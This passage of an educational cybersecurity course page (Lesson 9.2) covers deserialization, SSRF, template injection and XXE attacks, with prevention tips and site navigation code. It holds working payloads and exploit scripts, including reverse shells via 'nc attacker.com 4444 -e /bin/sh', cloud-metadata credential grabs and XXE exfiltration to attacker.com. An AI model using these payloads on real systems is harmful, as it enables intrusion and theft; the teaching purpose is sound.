+<pre><code class="language-javascript">// Cast to string
+username: String(req.body.username)
+
+// Validate type
+if (typeof req.body.username !== 'string') {
+    return res.status(400).send('Invalid input');
+}
+
+// Use parameterized queries
+db.users.findOne({
+    username: { $eq: req.body.username },
+    password: { $eq: req.body.password }
+})
+</code></pre>
+<h2 id="deserialization-attacks">Deserialization Attacks</h2>
+<p><strong>Exploits insecure deserialization of objects.</strong></p>
+<h3 id="python-pickle-rce">Python Pickle RCE</h3>
+<pre><code class="language-python">import pickle
+import os
+
+# Malicious class
+class Exploit:
+    def __reduce__(self):
+        # This executes when unpickled
+        return (os.system, ('nc attacker.com 4444 -e /bin/sh',))
+
+# Serialize malicious object
+evil_data = pickle.dumps(Exploit())
+
+# Victim deserializes
+pickle.loads(evil_data)  # EXECUTES COMMAND!
+</code></pre>
+<h3 id="java-deserialization">Java Deserialization</h3>
+<p><strong>Apache Commons Collections vulnerability:</strong></p>
+<pre><code class="language-java">// Vulnerable code
+ObjectInputStream ois = new ObjectInputStream(input);
+Object obj = ois.readObject();  // DANGEROUS!
+</code></pre>
+<p><strong>Exploitation using ysoserial:</strong></p>
+<pre><code class="language-bash"># Generate payload
+java -jar ysoserial.jar CommonsCollections1 'nc attacker.com 4444 -e /bin/sh' | base64
+
+# Send to vulnerable endpoint
+curl -X POST http://victim.com/api -d @payload
+</code></pre>
+<h3 id="php-unserialize">PHP Unserialize</h3>
+<pre><code class="language-php">&lt;?php
+// Vulnerable code
+$user = unserialize($_COOKIE['user']);
+
+// Malicious serialized object
+class Evil {
+    private $command;
+
+    function __wakeup() {
+        system($this-&gt;command);
+    }
+}
+
+$evil = new Evil();
+$evil-&gt;command = &quot;nc attacker.com 4444 -e /bin/sh&quot;;
+echo serialize($evil);
+?&gt;
+</code></pre>
+<p><strong>Prevention:</strong>
+- Never deserialize untrusted data
+- Use JSON instead of native serialization
+- Implement integrity checks (HMAC)
+- Whitelist allowed classes</p>
+<h2 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)</h2>
+<p><strong>Trick server into making requests to internal resources.</strong></p>
+<h3 id="basic-ssrf">Basic SSRF</h3>
+<pre><code class="language-python"># Vulnerable code
+import requests
+
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    response = requests.get(url)
+    return response.content
+</code></pre>
+<p><strong>Exploitation:</strong></p>
+<pre><code class="language-bash"># Access internal services
+http://victim.com/fetch?url=http://localhost:6379/
+# Access Redis
+
+http://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/
+# Access AWS metadata
+
+http://victim.com/fetch?url=http://internal-server/admin
+# Access internal admin panel
+
+http://victim.com/fetch?url=file:///etc/passwd
+# Read local files
+</code></pre>
+<h3 id="advanced-ssrf">Advanced SSRF</h3>
+<p><strong>Bypass filters:</strong></p>
+<pre><code class="language-bash"># URL encoding
+http://victim.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/
+
+# Alternative representations
+http://victim.com/fetch?url=http://127.1/
+http://victim.com/fetch?url=http://0x7f000001/
+
+# DNS rebinding
+http://victim.com/fetch?url=http://attacker-controlled-domain/
+# Domain resolves to internal IP
+
+# Protocol smuggling
+http://victim.com/fetch?url=gopher://internal-server:6379/_FLUSHALL
+# Use gopher to send arbitrary data
+</code></pre>
+<p><strong>Exploitation script:</strong></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import requests
+
+def ssrf_exploit(target_url, internal_url):
+    &quot;&quot;&quot;Exploit SSRF to access internal resource&quot;&quot;&quot;
+
+    # Various bypass techniques
+    payloads = [
+        internal_url,
+        internal_url.replace('127.0.0.1', 'localhost'),
+        internal_url.replace('127.0.0.1', '127.1'),
+        internal_url.replace('http://', 'http://127.0.0.1@'),
+        f&quot;http://attacker.com@{internal_url.split('//')[1]}&quot;,
+    ]
+
+    for payload in payloads:
+        try:
+            response = requests.get(
+                target_url,
+                params={'url': payload},
+                timeout=5
+            )
+
+            if response.status_code == 200:
+                print(f&quot;[+] Success with: {payload}&quot;)
+                print(response.text[:500])
+                return response.text
+        except:
+            continue
+
+    print(&quot;[-] All payloads failed&quot;)
+    return None
+
+# Exploit cloud metadata
+ssrf_exploit(
+    'http://victim.com/fetch',
+    'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+)
+</code></pre>
+<h2 id="template-injection">Template Injection</h2>
+<p><strong>Server-Side Template Injection (SSTI)</strong></p>
+<p><strong>Vulnerable code (Jinja2/Python):</strong></p>
+<pre><code class="language-python">from flask import Flask, request, render_template_string
+
+@app.route('/hello')
+def hello():
+    name = request.args.get('name')
+    template = f&quot;Hello {name}!&quot;  # VULNERABLE!
+    return render_template_string(template)
+</code></pre>
+<p><strong>Detection:</strong></p>
+<pre><code class="language-bash"># Test for injection
+http://victim.com/hello?name={{7*7}}
+# If output is &quot;49&quot;, vulnerable!
+
+# Identify template engine
+{{7*'7'}}  # Jinja2: 7777777
+${7*7}     # Freemarker: 49
+&lt;%= 7*7 %&gt; # ERB: 49
+</code></pre>
+<p><strong>Exploitation (Jinja2):</strong></p>
+<pre><code class="language-python"># Read files
+{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }}
+
+# Execute commands
+{{ config.__class__.__init__.__globals__['os'].popen('nc attacker.com 4444 -e /bin/sh').read() }}
+
+# More compact
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
+{% endif %}
+{% endfor %}
+</code></pre>
+<p><strong>Exploitation tool:</strong></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import requests
+
+def ssti_exploit(url, param):
+    &quot;&quot;&quot;Exploit SSTI vulnerability&quot;&quot;&quot;
+
+    # Test if vulnerable
+    test_payload = &quot;{{7*7}}&quot;
+    response = requests.get(url, params={param: test_payload})
+
+    if &quot;49&quot; in response.text:
+        print(&quot;[+] SSTI vulnerability confirmed!&quot;)
+
+        # RCE payload for Jinja2
+        rce_payload = &quot;{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}&quot;
+
+        response = requests.get(url, params={param: rce_payload})
+        print(f&quot;[+] Command output:\n{response.text}&quot;)
+    else:
+        print(&quot;[-] Not vulnerable or different template engine&quot;)
+
+# Usage
+ssti_exploit('http://victim.com/hello', 'name')
+</code></pre>
+<h2 id="xml-external-entity-xxe-injection">XML External Entity (XXE) Injection</h2>
+<p><strong>Exploits XML parsers that process external entities.</strong></p>
+<p><strong>Vulnerable code:</strong></p>
+<pre><code class="language-php">&lt;?php
+$xml = file_get_contents('php://input');
+$doc = new DOMDocument();
+$doc-&gt;loadXML($xml, LIBXML_NOENT);  // VULNERABLE!
+?&gt;
+</code></pre>
+<p><strong>Basic XXE - Read files:</strong></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;
+</code></pre>
+<p><strong>Blind XXE - Out-of-band:</strong></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+  &lt;!ENTITY % dtd SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;
+  %dtd;
+  %send;
+]&gt;
+&lt;root&gt;&lt;/root&gt;
+</code></pre>
+<p><strong>evil.dtd on attacker server:</strong></p>
+<pre><code class="language-xml">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'&gt;&quot;&gt;
+%all;
+</code></pre>
+<p><strong>XXE to SSRF:</strong></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;http://internal-server:8080/admin&quot;&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;
+</code></pre>
+<p><strong>Prevention:</strong></p>
+<pre><code class="language-python"># Python
+from defusedxml import ElementTree
+tree = ElementTree.parse(xml_file)
+
+# PHP
+libxml_disable_entity_loader(true);
+
+# Java
+factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+</code></pre>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<p><strong>Modern exploitation requires:</strong>
+- Deep understanding of memory layout
+- Knowledge of protection bypasses
+- Creative chaining of vulnerabilities
+- Patience and persistence</p>
+<p><strong>Common patterns:</strong>
+- Information disclosure → Exploit development
+- Authentication bypass → Privilege escalation
+- SSRF → Internal network access
+- Deserialization → Remote code execution</p>
+<p><strong>Defense strategies:</strong>
+- Input validation everywhere
+- Principle of least privilege
+- Defense in depth
+- Regular security audits
+- Bug bounty programs</p>
+<p><strong>Remember:</strong>
+- These techniques are for authorized testing only
+- Always have written permission
+- Document everything
+- Report responsibly
+- Continuous learning is essential</p>
+<p>Advanced exploitation is constantly evolving. Stay current with new techniques, study real-world exploits, and practice in legal environments like HackTheBox, TryHackMe, and bug bounty programs.</p>
+        
+
+        <!-- Lesson Navigation (only show on non-homepage pages) -->
+        
+        <div class="lesson-nav">
+            
+            <a href="../lesson9-1/" class="lesson-nav-button">
+                <span class="arrow">←</span>
+                <span>Previous: Lesson 9.1</span>
+            </a>
+            
+
+            <div class="lesson-nav-info">
+                <div class="current-lesson">Current Lesson</div>
+                <div class="lesson-title">Lesson 9.2</div>
+            </div>
+
+            
+            <a href="../lesson9-3/" class="lesson-nav-button">
+                <span>Next: Lesson 9.3</span>
+                <span class="arrow">→</span>
+            </a>
+            
+        </div>
+        
+    </div>
+
+    <footer>
+        <p>NCHS Cybersecurity | Built with MkDocs</p>
+        
+        <p>Copyright &copy; 2025 Mohamed Morsy</p>
+        
+    </footer>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
+    
+    <script src="../../../search_index.js"></script>
+    
+    <script>
+        function toggleMenu() {
+            const navLinks = document.getElementById('navLinks');
+            navLinks.classList.toggle('active');
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const unitHeaders = document.querySelectorAll('.nav-links .nested > strong');
+            
+            unitHeaders.forEach(header => {
+                header.addEventListener('click', function(e) {
+                    e.stopPropagation(); 
+                    const parent = this.parentElement;
+                    parent.classList.toggle('collapsed');
+                });
+            });
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const searchInput = document.getElementById('searchInput');
+            const searchResults = document.getElementById('searchResults');
+            
+            if (!searchInput || !searchResults) {
+                return;
+            }
+            
+            let searchIndex = null;
+            let useSimpleSearch = false;
+            
+            const simpleIndex = [
+                
+                    
+                
+                    
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 1.1",
+                                    url: '../../unit1/lesson1-1/',
+                                    path: 'Curriculum > Unit 1'
+                                },
+                                
+                                {
+                                    title: "Lesson 1.2",
+                                    url: '../../unit1/lesson1-2/',
+                                    path: 'Curriculum > Unit 1'
+                                },
+                                
+                                {
+                                    title: "Lesson 1.3",
+                                    url: '../../unit1/lesson1-3/',
+                                    path: 'Curriculum > Unit 1'
+                                },
+                                
+                                {
+                                    title: "Lesson 1.4",
+                                    url: '../../unit1/lesson1-4/',
+                                    path: 'Curriculum > Unit 1'
+                                },
+                                
+                                {
+                                    title: "Lesson 1.5",
+                                    url: '../../unit1/lesson1-5/',
+                                    path: 'Curriculum > Unit 1'
+                                },
+                                
+                                {
+                                    title: "Lesson 1.6",
+                                    url: '../../unit1/lesson1-6/',
+                                    path: 'Curriculum > Unit 1'
+                                },
+                                
+                                {
+                                    title: "Linux Installation Process",
+                                    url: '../../unit1/installation-process/',
+                                    path: 'Curriculum > Unit 1'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 2.1",
+                                    url: '../../unit2/lesson2-1/',
+                                    path: 'Curriculum > Unit 2'
+                                },
+                                
+                                {
+                                    title: "Lesson 2.2",
+                                    url: '../../unit2/lesson2-2/',
+                                    path: 'Curriculum > Unit 2'
+                                },
+                                
+                                {
+                                    title: "Lesson 2.3",
+                                    url: '../../unit2/lesson2-3/',
+                                    path: 'Curriculum > Unit 2'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 3.1",
+                                    url: '../../unit3/lesson3-1/',
+                                    path: 'Curriculum > Unit 3'
+                                },
+                                
+                                {
+                                    title: "Lesson 3.2",
+                                    url: '../../unit3/lesson3-2/',
+                                    path: 'Curriculum > Unit 3'
+                                },
+                                
+                                {
+                                    title: "Lesson 3.3",
+                                    url: '../../unit3/lesson3-3/',
+                                    path: 'Curriculum > Unit 3'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 4.1",
+                                    url: '../../unit4/lesson4-1/',
+                                    path: 'Curriculum > Unit 4'
+                                },
+                                
+                                {
+                                    title: "Lesson 4.2",
+                                    url: '../../unit4/lesson4-2/',
+                                    path: 'Curriculum > Unit 4'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 5.1",
+                                    url: '../../unit5/lesson5-1/',
+                                    path: 'Curriculum > Unit 5'
+                                },
+                                
+                                {
+                                    title: "Lesson 5.2",
+                                    url: '../../unit5/lesson5-2/',
+                                    path: 'Curriculum > Unit 5'
+                                },
+                                
+                                {
+                                    title: "Lesson 5.3",
+                                    url: '../../unit5/lesson5-3/',
+                                    path: 'Curriculum > Unit 5'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 6.1",
+                                    url: '../../unit6/lesson6-1/',
+                                    path: 'Curriculum > Unit 6'
+                                },
+                                
+                                {
+                                    title: "Lesson 6.2",
+                                    url: '../../unit6/lesson6-2/',
+                                    path: 'Curriculum > Unit 6'
+                                },
+                                
+                                {
+                                    title: "Lesson 6.3",
+                                    url: '../../unit6/lesson6-3/',
+                                    path: 'Curriculum > Unit 6'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 7.1",
+                                    url: '../../unit7/lesson7-1/',
+                                    path: 'Curriculum > Unit 7'
+                                },
+                                
+                                {
+                                    title: "Lesson 7.2",
+                                    url: '../../unit7/lesson7-2/',
+                                    path: 'Curriculum > Unit 7'
+                                },
+                                
+                                {
+                                    title: "Lesson 7.3",
+                                    url: '../../unit7/lesson7-3/',
+                                    path: 'Curriculum > Unit 7'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 8.1",
+                                    url: '../../unit8/lesson8-1/',
+                                    path: 'Curriculum > Unit 8'
+                                },
+                                
+                                {
+                                    title: "Lesson 8.2",
+                                    url: '../../unit8/lesson8-2/',
+                                    path: 'Curriculum > Unit 8'
+                                },
+                                
+                                {
+                                    title: "Lesson 8.3",
+                                    url: '../../unit8/lesson8-3/',
+                                    path: 'Curriculum > Unit 8'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 9.1",
+                                    url: '../lesson9-1/',
+                                    path: 'Curriculum > Unit 9'
+                                },
+                                
+                                {
+                                    title: "Lesson 9.2",
+                                    url: './',
+                                    path: 'Curriculum > Unit 9'
+                                },
+                                
+                                {
+                                    title: "Lesson 9.3",
+                                    url: '../lesson9-3/',
+                                    path: 'Curriculum > Unit 9'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 10.1",
+                                    url: '../../unit10/lesson10-1/',
+                                    path: 'Curriculum > Unit 10'
+                                },
+                                
+                                {
+                                    title: "Lesson 10.2",
+                                    url: '../../unit10/lesson10-2/',
+                                    path: 'Curriculum > Unit 10'
+                                },
+                                
+                                {
+                                    title: "Lesson 10.3",
+                                    url: '../../unit10/lesson10-3/',
+                                    path: 'Curriculum > Unit 10'
+                                },
+                                
+                            
+                        
+                            
+                                
+                                {
+                                    title: "Lesson 11.1",
+                                    url: '../../unit11/lesson11-1/',
+                                    path: 'Curriculum > Unit 11'
+                                },
+                                
+                                {
+                                    title: "Lesson 11.2",
+                                    url: '../../unit11/lesson11-2/',
+                                    path: 'Curriculum > Unit 11'
+                                },
+                                
+                                {
+                                    title: "Lesson 11.3",
+                                    url: '../../unit11/lesson11-3/',
+                                    path: 'Curriculum > Unit 11'
+                                },
+                                
+                            
+                        
+                    
+                
+                    
+                        {
+                            title: "Terminal",
+                            url: '../../../test/',
+                            path: 'Main'
+                        },
+                    
+                
+            ];
+            
+            if (typeof window.searchIndex !== 'undefined') {
+                searchIndex = window.searchIndex;
+                useSimpleSearch = false;
+                console.log('✓ Using embedded search index:', searchIndex.docs.length, 'documents');
+            } else {
+                const base_url = document.querySelector('base')?.getAttribute('href') || '/';
+                fetch(base_url + 'search_data.js')
+                    .then(response => response.text())
+                    .then(data => {
+                        eval(data);  
+                        if (window.searchIndex) {
+                            searchIndex = window.searchIndex;
+                            useSimpleSearch = false;
+                            console.log('✓ Loaded search index from JS:', searchIndex.docs.length, 'documents');
+                        }
+                    })
+                    .catch(() => {
+                        console.log('Using simple title search (full search not available)');
+                        useSimpleSearch = true;
+                    });
+                
+                useSimpleSearch = true; 
+            }
+            
+            function performSearch(query) {
+                if (!query || query.length < 2) {
+                    searchResults.classList.remove('active');
+                    return;
+                }
+                
+                if (useSimpleSearch || !searchIndex) {
+                    performSimpleSearch(query);
+                } else {
+                    performFullSearch(query);
+                }
+            }
+            
+            function performSimpleSearch(query) {
+                const lowerQuery = query.toLowerCase();
+                const results = simpleIndex.filter(item => 
+                    item.title.toLowerCase().includes(lowerQuery)
+                );
+                displaySimpleResults(results, query);
+            }
+            
+            function performFullSearch(query) {
+                const lowerQuery = query.toLowerCase();
+                const queryTerms = lowerQuery.split(/\s+/);
+                
+                const results = searchIndex.docs
+                    .map(doc => {
+                        let score = 0;
+                        let matchedText = '';
+                        
+                        if (doc.title && doc.title.toLowerCase().includes(lowerQuery)) {
+                            score += 10;
+                        }
+                        
+                        if (doc.text) {
+                            const text = doc.text.toLowerCase();
+                            queryTerms.forEach(term => {
+                                if (term.length < 2) return;
+                                const count = (text.match(new RegExp(escapeRegex(term), 'g')) || []).length;
+                                score += count;
+                                
+                                if (count > 0 && !matchedText) {
+                                    const index = text.indexOf(term);
+                                    const start = Math.max(0, index - 50);
+                                    const end = Math.min(text.length, index + term.length + 50);
+                                    matchedText = doc.text.substring(start, end);
+                                    if (start > 0) matchedText = '...' + matchedText;
+                                    if (end < text.length) matchedText = matchedText + '...';
+                                }
+                            });
+                        }
+                        
+                        return {
+                            title: doc.title,
+                            location: doc.location,
+                            text: matchedText || (doc.text ? doc.text.substring(0, 150) + '...' : ''),
+                            score: score
+                        };
+                    })
+                    .filter(result => result.score > 0)
+                    .sort((a, b) => b.score - a.score);
+                
+                displayFullResults(results, query);
+            }
+            
+            function displaySimpleResults(results, query) {
+                if (results.length === 0) {
+                    searchResults.innerHTML = '<div class="search-no-results">No results found</div>';
+                    searchResults.classList.add('active');
+                    return;
+                }
+                
+                const html = results.slice(0, 10).map(result => {
+                    const highlightedTitle = highlightText(result.title, query);
+                    return `
+                        <a href="${result.url}" class="search-result-item">
+                            <div class="search-result-title">${highlightedTitle}</div>
+                            <div class="search-result-path">${escapeHtml(result.path)}</div>
+                        </a>
+                    `;
+                }).join('');
+                
+                searchResults.innerHTML = html;
+                searchResults.classList.add('active');
+            }
+            
+            function displayFullResults(results, query) {
+                if (results.length === 0) {
+                    searchResults.innerHTML = '<div class="search-no-results">No results found</div>';
+                    searchResults.classList.add('active');
+                    return;
+                }
+                
+                const pathname = window.location.pathname;
+                let basePath = '/';
+                
+                const pathParts = pathname.split('/').filter(p => p);
+                
+                if (pathParts.length > 0 && !pathParts[0].endsWith('.html')) {
+                    const firstPart = pathParts[0];
+                    if (firstPart !== 'index' && firstPart !== 'search') {
+                        basePath = '/' + firstPart + '/';
+                    }
+                }
+                
+                console.log('Current pathname:', pathname);
+                console.log('Detected base path:', basePath);
+                
+                const html = results.slice(0, 10).map(result => {
+                    const highlightedTitle = highlightText(result.title, query);
+                    const highlightedText = highlightText(result.text, query);
+                    
+                    let path = result.location.replace(/^\//, '').replace(/\.html$/, '').replace(/\//g, ' > ');
+                    if (!path) path = 'Home';
+                    
+                    let url;
+                    if (basePath === '/') {
+                        url = result.location;
+                    } else {
+                        const cleanLocation = result.location.startsWith('/') ? result.location.substring(1) : result.location;
+                        url = basePath + cleanLocation;
+                    }
+                    
+                    console.log('Result:', result.title, '-> URL:', url);
+                    
+                    return `
+                        <a href="${url}" class="search-result-item">
+                            <div class="search-result-title">${highlightedTitle}</div>
+                            <div class="search-result-path">${escapeHtml(path)}</div>
+                            <div class="search-result-excerpt">${highlightedText}</div>
+                        </a>
+                    `;
+                }).join('');
+                
+                searchResults.innerHTML = html;
+                searchResults.classList.add('active');
+            }
+            
+            function highlightText(text, query) {
+                if (!text) return '';
+                const queryTerms = query.split(/\s+/).filter(t => t.length >= 2);
+                let result = escapeHtml(text);
+                queryTerms.forEach(term => {
+                    const regex = new RegExp('(' + escapeRegex(term) + ')', 'gi');
+                    result = result.replace(regex, '<span class="search-highlight">$1</span>');
+                });
+                return result;
+            }
+            
+            function escapeRegex(string) {
+                return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+            }
+            
+            function escapeHtml(text) {
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            }
+            
+            let searchTimeout;
+            searchInput.addEventListener('input', function(e) {
+                clearTimeout(searchTimeout);
+                searchTimeout = setTimeout(() => performSearch(e.target.value), 300);
+            });
+            
+            searchInput.addEventListener('focus', function(e) {
+                if (e.target.value.length >= 2) {
+                    performSearch(e.target.value);
+                }
+            });
+            
+            document.addEventListener('click', function(e) {
+                if (!searchInput.contains(e.target) && !searchResults.contains(e.target)) {
+                    searchResults.classList.remove('active');
+                }
+            });
+            
+            searchInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    searchResults.classList.remove('active');
+                    searchInput.blur();
+                }
+            });
+        });
+
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('pre code').forEach((block) => {
+                block.parentElement.style.position = 'relative';
+            });
+        });
+        
+    </script>
+</body>
+</html>
